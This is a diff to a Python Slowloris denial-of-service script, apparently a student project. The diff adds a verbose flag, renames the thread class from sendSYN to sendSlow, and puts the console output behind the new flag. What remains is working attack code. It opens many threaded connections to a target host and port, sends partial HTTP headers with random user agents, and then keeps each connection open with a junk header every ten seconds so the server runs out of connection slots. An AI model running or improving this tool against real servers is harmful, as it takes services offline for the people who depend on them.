@@ -60,8 +60,9 @@ def print_help():
     print("  -H or --host\tIP address of the server.")
     print("  -P or --port\tPort of the server.")
     print("  -T or --thread\tMultithread.")
+    print("  -V or --verbose\tVerbose mode")
     print("Example:")
-    print("  python3 %s -H TARGET_IP -P TARGET_PORT -T N_THREAD"
+    print("  python3 %s -H TARGET_IP -P TARGET_PORT -T N_THREAD -V IF_VERBOSE"
           % (sys.argv[0]))
     print()
 
@@ -75,7 +76,8 @@ def getopt(ARGS):
             exit(0)
     ret = {"host": TARGET_DEFAULT,
            "port": PORT_DEFAULT,
-           "thread": THREAD_DEFAULT}
+           "thread": THREAD_DEFAULT,
+           "verbose": True}
     for i in range(1, len(ARGS)):
         if i % 2 == 1:
             if ARGS[i] in ['-H', '--host']:
@@ -84,6 +86,11 @@ def getopt(ARGS):
                 ret['port'] = int(ARGS[i + 1])
             elif ARGS[i] in ['-T', '--thread']:
                 ret['thread'] = int(ARGS[i + 1])
+            elif ARGS[i] in ['-V', '--verbose']:
+                if ARGS[i + 1] == 'y':
+                    ret['verbose'] = True
+                else:
+                    ret['verbose'] = False
             else:
                 try:
                     assert False
@@ -93,25 +100,28 @@ def getopt(ARGS):
     return ret
 
 
-class sendSYN(threading.Thread):
+class sendSlow(threading.Thread):
     THREAD = 0
 
-    def __init__(self, target, port):
+    def __init__(self, target, port, verbose=False):
         try:
             self.__target = target
             self.__port = port
-            self.__id = sendSYN.THREAD
-            sendSYN.THREAD += 1
+            self.__id = sendSlow.THREAD
+            self.__verbose = verbose
+            sendSlow.THREAD += 1
             threading.Thread.__init__(self)
         except KeyboardInterrupt:
-            print("\nSlow Loris attack ends!")
+            if self.__verbose:
+                print("\nSlow Loris attack ends!")
             exit(0)
 
     def __del__(self):
         try:
-            sendSYN.THREAD -= 1
+            sendSlow.THREAD -= 1
         except KeyboardInterrupt:
-            print("\nSlow Loris attack ends!")
+            if self.__verbose:
+                print("\nSlow Loris attack ends!")
             exit(0)
 
     def run(self):
@@ -121,7 +131,8 @@ class sendSYN(threading.Thread):
                 con = s.connect((self.__target,self.__port))
                 break
             except KeyboardInterrupt:
-                print("\nSYN flood attack ends!")
+                if self.__verbose:
+                    print("\nSYN flood attack ends!")
                 exit(0)
             except:
                 continue
@@ -130,58 +141,65 @@ class sendSYN(threading.Thread):
             s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
             s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
             s.send("{}\r\n".format("Cache-Control: no-cache").encode("utf-8"))
-            #s.send("{}\r\n".format("Cache-Control: no-cache").encode("utf-8"))
-            #print("\r%d threads running" % sendSYN.THREAD, end="")
-            #print("\nsocket build successful!")
+            s.send("{}\r\n".format("Cache-Control: no-cache").encode("utf-8"))
+            if self.__verbose:
+                print("\r%d threads running" % sendSlow.THREAD, end="")
+                print("\nsocket build successful!")
         except KeyboardInterrupt:
-            print("\nSYN flood attack ends!")
+            if self.__verbose:
+                print("\nSYN flood attack ends!")
             exit(0)
         except:
-            print("\nsocket build2 error!")
+            if self.__verbose:
+                print("\nsocket build2 error!")
             return
         while True:
             try:
-                #print("send a pair")
+                if self.__verbose:
+                    print("send a pair")
                 s.send("H-s: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                 time.sleep(10)
             except KeyboardInterrupt:
-                print("\nSlowLoris flood attack ends!")
+                if self.__verbose:
+                    print("\nSlowLoris flood attack ends!")
                 exit(0)
             except:
-                print("\nsocket error!")
                 return
 
 
 if __name__ == "__main__":
 
     args = getopt(sys.argv)
-    print()
-    print("+--------------------------+")
-    print("|                          |")
-    print("|      SlowLoris           |")
-    print("|                          |")
-    print("|       by TakingOffPKU    |")
-    print("|                          |")
-    print("+--------------------------+")
-    print()
-    print("Host: %s" % args["host"])
-    print("Port: %d" % args["port"])
-    print("Thread: %d" % args["thread"])
-    print()
-    print("SlowLoris attack will begin in")
+    if args['verbose'] == True:
+        print()
+        print("+--------------------------+")
+        print("|                          |")
+        print("|      SlowLoris           |")
+        print("|                          |")
+        print("|       by TakingOffPKU    |")
+        print("|                          |")
+        print("+--------------------------+")
+        print()
+        print("Host: %s" % args["host"])
+        print("Port: %d" % args["port"])
+        print("Thread: %d" % args["thread"])
+        print()
+        print("SlowLoris attack will begin in")
     countdown = 5
     for i in range(countdown, 0, -1):
-        string = '\r'
-        for j in range(countdown, i - 1, -1):
-            string += str(j) + "..."
-        print(string, end="")
+        if args['verbose'] == True:
+            string = '\r'
+            for j in range(countdown, i - 1, -1):
+                string += str(j) + "..."
+            print(string, end="")
         time.sleep(1)
-    print("\nSlowLoris attack begins!")
+    if args['verbose'] == True:
+        print("\nSlowLoris attack begins!")
 
     while True:
         try:
-            if sendSYN.THREAD <= args['thread']:
-                tmp = sendSYN(args['host'], args['port'])
+            if sendSlow.THREAD <= args['thread']:
+                tmp = sendSlow(args['host'], args['port'], args['verbose'])
                 tmp.start()
                 #time.sleep(10/args['thread'])
         except KeyboardInterrupt:
